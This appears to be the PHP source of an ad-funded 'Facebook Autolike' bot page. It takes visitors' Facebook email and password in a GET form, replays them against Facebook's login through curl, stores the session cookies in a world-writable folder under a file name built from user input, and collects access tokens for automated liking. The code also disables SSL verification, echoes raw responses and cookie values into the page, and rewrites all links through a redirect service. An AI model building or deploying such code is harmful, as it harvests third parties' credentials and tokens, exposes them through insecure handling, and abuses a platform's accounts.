<?php
session_start();
ob_start();
if (isset($_GET["logout"]) || isset($_GET["flush"])){
  include("flush.php");
  die();
}
?>
<!DOCTYPE HTML>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Manual Login | Bot Reaction Facebook v2</title>
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous" />
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-7975270895217217",
          enable_page_level_ads: true
     });
</script>
<style>
#ajax,.input-group,form{margin-top:20px}
*{word-wrap: break-word;max-width;100%;}
</style>
<script>
function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
        //expires = "; expires=2030";
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
function eraseCookie(name) {   
    document.cookie = name+'=; Max-Age=-99999999;';  
}

</script>
</head>
<body>
<div class="container">
<center>
<h1>Facebook Autolike Timeline</h1>
</center>
<blockquote>Belum punya akses token ?. <a href="http://simpleliker.net/ss/token_myfbliker.php" target="_blank">Klik Disini</a> untuk mendapatkan akses token.</blockquote>

<?php
if (!is_dir("cache")){
$oldmask = umask(0);
mkdir("cache", 0777);
umask($oldmask);
}

//$login_email = 'dimaslanjaka1';
//$login_pass = 'lukaku';
if (isset($_GET["email"])){
$login_email = $_GET["email"];
} elseif (isset($_POST["email"])){
$login_email = $_POST["email"];
} else {
$login_email = null;
}
$login_email = urldecode($login_email);
if (isset($_GET["pass"])){
$login_pass = $_GET["pass"];
} elseif (isset($_POST["pass"])){
$login_pass = $_POST["pass"];
} else {
$login_pass = null;
}
$login_pass = urldecode($login_pass);

$cookie="cache/$login_email.txt";
$cookie=dirname(__FILE__)."/".$cookie;
//@unlink($cookie);

function check(){
global $cookie;
return $cookie;
}

function Login(){
global $login_email;
global $login_pass;
global $cookie;

$ipku = $_SERVER['REMOTE_ADDR']; 
$headers[] = "REMOTE_ADDR: $ipku";
$headers[] = "HTTP_X_FORWARDED_FOR: $ipku";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.facebook.com/login.php');
curl_setopt($ch, CURLOPT_POSTFIELDS,'email='.$login_email.'&pass='.$login_pass.'&login=Login'); //urlencode
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3");
curl_setopt($ch, CURLOPT_REFERER, "http://www.facebook.com");
$headers[] = "Host: www.facebook.com";
$headers[] = "Origins: https://www.facebook.com";
$headers[] = "Authority: www.facebook.com";
$headers[] = 'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5'; 
$headers[] = 'Connection: Keep-Alive';
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'Content-type: application/x-www-form-urlencoded,*/*;charset=UTF-8';
//'Content-Type: '
$headers[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
$headers[] = "Accept-Language: en-us,en;q=0.5";
$headers[] = "Pragma: no-cache";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$page = curl_exec($ch) or die(curl_error($ch));

return $page;
}

// Cookie Set
if(isset($_COOKIE['uid'])){
$user = $_COOKIE['uid'];
?>
<pre style="word-wrap; break-word">
User ID : <?php echo $_COOKIE["uid"]; ?>
</pre>
<center>
Fill your tokens below :
</center>
<form id="fire" class="form-group" action="?ready" method="POST">
 <div class="input-group">
 <span class="input-group-addon">Token</span>
 <input id="msg" type="text" class="form-control" name="msg" placeholder="Input Your Tokens Here" />
 <input id="submitmsg" type="submit" name="submit" class="btn btn-block btn-primary" value="My Token Ready" />
 </div>
</form>
<script>
var form = $("#fire");
var inputBox = $("#msg");
var submitButton = $("#submitmsg");
submitButton.click(function(){
var getval = $("#msg").val();
setCookie('token',getval,1);
});
</script>
<?php
if (strpos($_SERVER['REQUEST_URI'],'ready') !== false) {
?>
<style>#fire{display:none}</style>
<center><button class='btn btn-primary btn-block' id='ajax'>Perform My Autolike</button></center>
<?php
}
?>
<div class="result"></div>
<script>
var msg = $('input[name="msg"]').val();
$("#ajax").click(function(e) {
    e.preventDefault();
    $.ajax({
        type: "POST",
        url: "create.php",
        data: { 
            namefile: getCookie('uid'), 
            msg: getCookie('token')
        },
        success: function(result) {
            document.write(result);
        },
        error: function(result) {
            document.write(result);
        }
    });
});
</script>
<?php
} elseif (isset($_GET["email"]) && isset($_GET["pass"]) || isset($_POST["email"]) && isset($_POST["pass"])){


$re = '/profile_pic_header_+([0-9]{0,15})/m';
$str = Login();

if (preg_match_all($re, $str, $matches, PREG_SET_ORDER, 0)){
if (!empty($matches[0][1])){
$id = $matches[0][1];
} elseif (!empty($matches[1])){
$id = $matches[1];
}
echo "<pre style='word-wrap: break-word'>";
echo $id . "<br/>";
var_dump($matches);
echo "</pre>";
if (!empty($id)){
setcookie("uid", $id, time() + (86400 * 30), "/");
}

if (isset($_COOKIE["uid"]) || !empty($id)){
  ?>
  <script>
  window.location.href = "login.php";
  </script>
  <?php
}

} else {
  echo "<pre style='word-wrap: break-word'>";
echo "Cant Logged In, Please Try again. make sure the username / email / telephone number and password you entered are correct. OR <a href='//www.facebook.com/dimaslanjaka1'>Contact Me <i class='fa fa-facebook'/></a>";
echo "<hr/>";
var_dump($matches);
  echo "</pre>";
  echo '<center>Debug Your Login:</center><div style="overflow:auto">'.$str.'</div>';
}

} else {
?>
<form id="" class="form-group" action="?ready" method="GET">
 <div class="input-group">
 <span class="input-group-addon">Login</span>
 <input id="" type="text" class="form-control" name="email" placeholder="Username/Email/Phone" />
 <input id="" type="password" class="form-control" name="pass" placeholder="Password" />
 <input id="" type="submit" name="submit" class="btn btn-block btn-primary" value="Submit" />
 </div>
</form>
<script>
<?php
}
?>

<div class="row">
<div class="col-sm-4">

<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-7975270895217217" data-ad-slot="2600604346" data-ad-format="auto"></ins><script>(adsbygoogle=window.adsbygoogle || []).push({});</script>
 </div>
<div class="col-sm-4">

<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-7975270895217217" data-ad-slot="4025331886" data-ad-format="auto"></ins><script>(adsbygoogle=window.adsbygoogle || []).push({});</script>
 </div>
<div class="col-sm-4">

<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-7975270895217217" data-ad-slot="7267894124" data-ad-format="auto"></ins><script>(adsbygoogle=window.adsbygoogle || []).push({});</script>
 </div>
</div>

</div>

<script type="text/javascript">
var myArray = ['https://web-manajemen.blogspot.com/p/a.html?u='];
var safelink = myArray[Math.floor(Math.random() * myArray.length)];
var protectedLinks = /(dimaslanjaka|bing.com|google.com|linkedin.com|facebook.com|pinterest.com|digg.com|twitter.com|blogger.com|ask.com|secretnetworkforces|sembilanan.tk|webmanajemen.xyz|linkshrink.net|afu.php|nullrefer.com)/
$( 'a' ).each(function() {
if (this.href.match( protectedLinks ) ){
    $(this).attr('href', $(this).attr('href'));
  } else {
    $(this).attr('href', safelink+encodeURIComponent($(this).attr('href')));
  }
});
</script>
</body>
</html>
<?php
$output = ob_get_contents();
ob_clean();
ob_start();
include("minify.php");
echo minify_html($output);
?>